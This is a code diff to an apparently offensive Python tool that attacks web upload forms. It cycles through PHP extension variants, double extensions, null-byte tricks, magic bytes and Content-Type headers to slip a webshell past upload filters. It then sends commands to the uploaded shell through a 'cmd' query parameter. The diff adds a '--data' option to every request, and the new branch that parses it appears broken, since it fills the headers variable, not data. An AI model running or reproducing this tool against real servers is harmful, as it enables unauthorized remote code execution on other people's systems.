@@ -15,7 +15,7 @@ from urllib import request
 
 
 def auth(URL, SUCCESS, EXTENSION, ALLOWED_EXT, proxies, TLS, headers, brute_force, verbosity, location, username,
-         password):
+         password, data):
     sauce = urllib.request.urlopen(URL).read()
     soup = bs.BeautifulSoup(sauce, "html.parser")
     form = soup.find('form')
@@ -35,11 +35,11 @@ def auth(URL, SUCCESS, EXTENSION, ALLOWED_EXT, proxies, TLS, headers, brute_forc
     session.post(URL, data=payload)
 
     file_extension(URL, SUCCESS, EXTENSION, ALLOWED_EXT, proxies, TLS, headers, brute_force, verbosity, location,
-                   session)
+                   session, data)
 
 
 def file_extension(URL, SUCCESS, EXTENSION, ALLOWED_EXT, proxies, TLS, headers, brute_force, verbosity, location,
-                   session):
+                   session, data):
     # Brute forcing different extensions
 
     try:
@@ -64,10 +64,8 @@ def file_extension(URL, SUCCESS, EXTENSION, ALLOWED_EXT, proxies, TLS, headers, 
 
         response = session.get(URL, allow_redirects=False)
         sauce = response.text
-        print(response.text)
         soup = bs.BeautifulSoup(sauce, "html.parser")
         form = soup.find('form')
-        print(form)
         file_attr = form.find('input', type='file').get('name')
 
         for ext in eval(EXTENSION):
@@ -80,7 +78,8 @@ def file_extension(URL, SUCCESS, EXTENSION, ALLOWED_EXT, proxies, TLS, headers, 
                 f'{file_attr}': (filename_ext, open(filename, 'rb'), 'image/jpeg'),
             }
 
-            response = session.post(URL, files=files, headers=headers, allow_redirects=False, proxies=proxies,
+            response = session.post(URL, files=files, headers=headers, data=data, allow_redirects=False,
+                                    proxies=proxies,
                                     verify=TLS)
 
             print(f"[-] Trying differet {EXTENSION} extensions!")
@@ -119,7 +118,7 @@ def file_extension(URL, SUCCESS, EXTENSION, ALLOWED_EXT, proxies, TLS, headers, 
                             domain = urlparse(URL).netloc
                             final_url = f"http://{domain}{location}{filename_ext}?cmd={cmd_encoded}"
 
-                            response = session.get(final_url, headers=headers, allow_redirects=False,
+                            response = session.get(final_url, headers=headers, data=data, allow_redirects=False,
                                                    proxies=proxies, verify=TLS)
                             print(f"URL is: {final_url}")
                             print(response.text)
@@ -141,11 +140,11 @@ def file_extension(URL, SUCCESS, EXTENSION, ALLOWED_EXT, proxies, TLS, headers, 
         raise SystemExit(error)
 
     double_extension(URL, SUCCESS, EXTENSION, ALLOWED_EXT, counter, proxies, TLS, headers, brute_force, verbosity,
-                     location, session, file_attr)
+                     location, session, file_attr, data)
 
 
 def double_extension(URL, SUCCESS, EXTENSION, ALLOWED_EXT, counter, proxies, TLS, headers, brute_force, verbosity,
-                     location, session, file_attr):
+                     location, session, file_attr, data):
     # Doubling the extension
 
     php = [".php", ".php2", ".php3", ".php4", ".php5", ".php6", ".php7", ".phps", ".phps", ".pht", ".phtm", ".phtml",
@@ -211,7 +210,8 @@ def double_extension(URL, SUCCESS, EXTENSION, ALLOWED_EXT, counter, proxies, TLS
                         domain = urlparse(URL).netloc
                         final_url = f"http://{domain}{location}{filename_ext}?cmd={cmd_encoded}"
 
-                        response = session.get(final_url, headers=headers, allow_redirects=False, proxies=proxies,
+                        response = session.get(final_url, headers=headers, data=data, allow_redirects=False,
+                                               proxies=proxies,
                                                verify=TLS)
                         print(f"URL is: {final_url}")
                         print(response.text)
@@ -230,11 +230,11 @@ def double_extension(URL, SUCCESS, EXTENSION, ALLOWED_EXT, counter, proxies, TLS
                 sys.exit(1)
 
     null_bytes(EXTENSION, URL, ALLOWED_EXT, counter, SUCCESS, proxies, TLS, headers, brute_force, verbosity, location,
-               session, file_attr)
+               session, file_attr, data)
 
 
 def null_bytes(EXTENSION, URL, ALLOWED_EXT, counter, SUCCESS, proxies, TLS, headers, brute_force, verbosity, location,
-               session, file_attr):
+               session, file_attr, data):
     # Adds null bytes to the end of extensions
 
     php = [".php", ".php2", ".php3", ".php4", ".php5", ".php6", ".php7", ".phps", ".phps", ".pht", ".phtm", ".phtml",
@@ -264,7 +264,7 @@ def null_bytes(EXTENSION, URL, ALLOWED_EXT, counter, SUCCESS, proxies, TLS, head
                 'submit': (None, 'Upload Image')
             }
 
-            response = session.post(URL, files=files, headers=headers,
+            response = session.post(URL, files=files, headers=headers, data=data,
                                     allow_redirects=False, proxies=proxies, verify=TLS)
 
             print(f"[-] Try {counter} with: {filename_ext}")
@@ -302,7 +302,8 @@ def null_bytes(EXTENSION, URL, ALLOWED_EXT, counter, SUCCESS, proxies, TLS, head
                             domain = urlparse(URL).netloc
                             final_url = f"http://{domain}{location}{filename_ext}?cmd={cmd_encoded}"
 
-                            response = session.get(final_url, headers=headers, allow_redirects=False, proxies=proxies,
+                            response = session.get(final_url, headers=headers, data=data, allow_redirects=False,
+                                                   proxies=proxies,
                                                    verify=TLS)
                             print(f"URL is: {final_url}")
                             print(response.text)
@@ -328,17 +329,17 @@ def null_bytes(EXTENSION, URL, ALLOWED_EXT, counter, SUCCESS, proxies, TLS, head
 
         for valid in valid_extensions:
             magic_bytes(EXTENSION, valid, URL, counter, SUCCESS, proxies, TLS, headers, brute_force, verbosity,
-                        location, session, file_attr)
+                        location, session, file_attr, data)
 
     else:
         valid = "".join(temp_extension)
 
         magic_bytes(EXTENSION, valid, URL, counter, SUCCESS, proxies, TLS, headers, brute_force, verbosity, location,
-                    session, file_attr)
+                    session, file_attr, data)
 
 
 def magic_bytes(EXTENSION, valid, URL, counter, SUCCESS, proxies, TLS, headers, brute_force, verbosity, location,
-                session, file_attr):
+                session, file_attr, data):
     # Uploading files with
 
     php = [".php", ".php2", ".php3", ".php4", ".php5", ".php6", ".php7", ".phps", ".phps", ".pht", ".phtm", ".phtml",
@@ -373,7 +374,7 @@ def magic_bytes(EXTENSION, valid, URL, counter, SUCCESS, proxies, TLS, headers, 
                 'submit': (None, 'Upload Image')
             }
 
-            response = session.post(URL, files=files, headers=headers,
+            response = session.post(URL, files=files, headers=headers, data=data,
                                     allow_redirects=False, proxies=proxies, verify=TLS)
 
             if verbosity:
@@ -411,7 +412,8 @@ def magic_bytes(EXTENSION, valid, URL, counter, SUCCESS, proxies, TLS, headers, 
                             domain = urlparse(URL).netloc
                             final_url = f"http://{domain}{location}{filename_ext}?cmd={cmd_encoded}"
 
-                            response = session.get(final_url, headers=headers, allow_redirects=False, proxies=proxies,
+                            response = session.get(final_url, headers=headers, data=data, allow_redirects=False,
+                                                   proxies=proxies,
                                                    verify=TLS)
                             print(f"URL is: {final_url}")
                             print(response.text)
@@ -442,7 +444,7 @@ def magic_bytes(EXTENSION, valid, URL, counter, SUCCESS, proxies, TLS, headers, 
                 'submit': (None, 'Upload Image')
             }
 
-            response = session.post(URL, files=files, headers=headers,
+            response = session.post(URL, files=files, headers=headers, data=data,
                                     allow_redirects=False, proxies=proxies, verify=TLS)
 
             if verbosity:
@@ -478,7 +480,8 @@ def magic_bytes(EXTENSION, valid, URL, counter, SUCCESS, proxies, TLS, headers, 
                             domain = urlparse(URL).netloc
                             final_url = f"http://{domain}{location}{filename_ext}?cmd={cmd_encoded}"
 
-                            response = session.get(final_url, headers=headers, allow_redirects=False, proxies=proxies,
+                            response = session.get(final_url, headers=headers, data=data, allow_redirects=False,
+                                                   proxies=proxies,
                                                    verify=TLS)
                             print(f"URL is: {final_url}")
                             print(response.text)
@@ -497,11 +500,11 @@ def magic_bytes(EXTENSION, valid, URL, counter, SUCCESS, proxies, TLS, headers, 
                     sys.exit()
 
     upload_file(URL, SUCCESS, EXTENSION, counter, proxies, TLS, headers, brute_force, verbosity, location, session,
-                file_attr)
+                file_attr, data)
 
 
 def upload_file(URL, SUCCESS, EXTENSION, counter, proxies, TLS, headers, brute_force, verbosity, location, session,
-                file_attr):
+                file_attr, data):
     print("[-] Trying different content-type headers. Please be patient!")
 
     with open("./content-type.txt", encoding='latin-1') as file:
@@ -517,7 +520,7 @@ def upload_file(URL, SUCCESS, EXTENSION, counter, proxies, TLS, headers, brute_f
                 'submit': (None, 'Upload Image')
             }
 
-            response = session.post(URL, files=files, headers=headers,
+            response = session.post(URL, files=files, headers=headers, data=data,
                                     allow_redirects=False, proxies=proxies, verify=TLS)
 
             if verbosity:
@@ -551,7 +554,8 @@ def upload_file(URL, SUCCESS, EXTENSION, counter, proxies, TLS, headers, brute_f
                             domain = urlparse(URL).netloc
                             final_url = f"http://{domain}{location}shell.{EXTENSION}?cmd={cmd_encoded}"
 
-                            response = session.get(final_url, headers=headers, allow_redirects=False, proxies=proxies,
+                            response = session.get(final_url, headers=headers, data=data, allow_redirects=False,
+                                                   proxies=proxies,
                                                    verify=TLS)
                             print(f"URL is: {final_url}")
                             print(response.text)
@@ -595,6 +599,10 @@ def main():
                       help='(Optional) - for example: \'"X-Forwarded-For": "10.10.10.10"\' - Use double quotes and wrapp it with single quotes. Use comma to separate multi headers.',
                       default="optional")
 
+    parser.add_option('-d', "--data", type="string", dest="data",
+                      help='(Optional) - for example: \'"submit": "submit"\' - Use double quotes and wrapp it with single quotes. Use comma to separate multi headers.',
+                      default="optional")
+
     parser.add_option('-l', "--location", type="string", dest="location",
                       help='(Optional) - Supply a remote path where the webshell suppose to be. For exmaple: /uploads/',
                       default="optional")
@@ -630,6 +638,7 @@ def main():
     brute_force = options.continue_brute
     username = options.username
     password = options.password
+    data = options.data
     verbosity = options.verbosity
     location = options.location
 
@@ -671,6 +680,16 @@ def main():
             "User-Agent": "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36"
         }
 
+    if data != 'optional':
+
+        temp = "{" + str(HEADER) + "}"
+        headers = json.loads(temp)
+
+    else:
+        data = {
+            "dummy": "dummy"
+        }
+
     positional_args = [URL, SUCCESS, EXTENSION, ALLOWED_EXT]
 
     if len(sys.argv) < 2:
@@ -688,12 +707,12 @@ def main():
             if username != 'optional' and password != 'optional':
 
                 auth(URL, SUCCESS, EXTENSION, ALLOWED_EXT, proxies, TLS, headers, brute_force, verbosity,
-                     location, username, password)
+                     location, username, password, data)
 
             else:
                 session = requests.Session()
                 file_extension(URL, SUCCESS, EXTENSION, ALLOWED_EXT, proxies, TLS, headers, brute_force, verbosity,
-                               location, session)
+                               location, session, data)
 
 
 if __name__ == "__main__":
